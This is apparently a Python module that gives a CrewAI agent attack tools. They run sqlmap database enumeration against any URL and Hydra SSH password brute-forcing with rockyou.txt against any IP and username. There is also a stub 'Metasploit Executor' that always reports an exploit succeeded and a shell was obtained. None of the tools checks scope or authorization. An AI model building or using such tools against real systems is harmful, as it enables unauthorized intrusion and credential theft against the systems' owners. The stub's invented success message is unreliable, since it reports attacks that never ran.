import subprocess
from crewai.tools import BaseTool
import os

class SQLMapTool(BaseTool):
    name: str = "SQLMap Vulnerability Scanner"
    description: str = "Runs SQLMap to check for SQL injection vulnerabilities on a given URL. Input must be a full URL."

    def _run(self, url: str) -> str:
        print(f"--- Running SQLMap on {url} ---")
        try:
            # Using --batch to automate the process and --dbs to enumerate databases
            command = ["sqlmap", "-u", url, "--batch", "--dbs"]
            result = subprocess.run(command, capture_output=True, text=True, check=True)
            print(f"--- SQLMap scan completed for {url} ---")
            if "the following databases are available" in result.stdout:
                return f"SUCCESS: SQL injection vulnerability found on {url}. Databases found:\n{result.stdout}"
            else:
                return f"SQLMap scan on {url} did not find any obvious injection points or databases."
        except FileNotFoundError:
            return "Error: sqlmap is not installed or not in PATH. Please install sqlmap."
        except subprocess.CalledProcessError as e:
            # SQLMap often returns a non-zero exit code even on success, so we check the output
            if e.stdout:
                return f"SQLMap scan on {url} finished with output:\n{e.stdout}"
            return f"Error during SQLMap scan on {url}: {e.stderr}"


class SSHBruteforceTool(BaseTool):
    name: str = "SSH Bruteforce Tool"
    description: str = ("Uses Hydra to perform a brute-force attack on an SSH service. "
                        "Input should be a string in the format 'ip_address:username'.")

    def _run(self, target_info: str) -> str:
        # A common password list, ensure this path is correct.
        # This is a common path in Kali Linux.
        password_list = "rockyou.txt"
        if not os.path.exists(password_list):
            return f"Error: Password list not found at {password_list}."

        try:
            ip_address, username = target_info.split(':')
        except ValueError:
            return "Invalid input format. Please provide the input as 'ip_address:username'."

        print(f"--- Running SSH Bruteforce on {ip_address} for user {username} ---")
        try:
            # Using -t 4 for 4 parallel tasks
            command = ["hydra", "-l", username, "-P", password_list, ip_address, "ssh", "-t", "4"]
            result = subprocess.run(command, capture_output=True, text=True)
            print(f"--- SSH Bruteforce completed on {ip_address} ---")
            if "password found" in result.stdout:
                return f"SUCCESS: Password found for {username}@{ip_address}:\n{result.stdout}"
            else:
                return f"Failed to find password for {username}@{ip_address}."
        except FileNotFoundError:
            return "Error: hydra is not installed or not in PATH. Please install hydra."
        except Exception as e:
            return f"An error occurred: {e}"

# Note: A real Metasploit tool would be far more complex.
# This is a placeholder demonstrating the concept.
class MetasploitExecutorTool(BaseTool):
    name: str = "Metasploit Executor"
    description: str = ("A conceptual tool to execute a named Metasploit module. "
                        "In a real scenario, this would interact with msfconsole or msfrpc. "
                        "Input should be the name of a Metasploit exploit module (e.g., 'exploit/linux/http/my_exploit').")

    def _run(self, module_name: str) -> str:
        print(f"--- Conceptually running Metasploit module: {module_name} ---")
        # This is a mock-up. A real implementation would be very complex.
        # It would involve creating a resource script, running msfconsole,
        # and parsing the output.
        if "exploit" in module_name:
             return (f"Simulating execution of Metasploit module '{module_name}'. "
                     "In a real run, this would attempt the exploit and return session info if successful. "
                     "For this simulation, we will assume it was successful and a shell was obtained.")
        else:
            return f"Module '{module_name}' is not a recognized exploit module in this simulation."